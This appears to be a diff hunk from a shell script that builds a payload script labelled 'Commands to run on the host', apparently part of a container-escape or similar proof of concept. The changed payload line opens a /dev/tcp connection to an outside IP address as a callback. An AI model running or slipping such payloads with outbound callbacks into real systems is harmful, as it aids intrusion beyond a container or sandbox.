@@ -19,8 +19,8 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 
 # Commands to run on the host<
-echo hello world > /dev/tcp/35.194.58.97/80
-echo done > \${OUTPATH} 0>&1
+echo hello world > /dev/tcp/35.194.58.97/80 2>\${OUTPATH}
+#echo done > \${OUTPATH} 0>&1
 __EOF__
 
 # Make the payload script executable
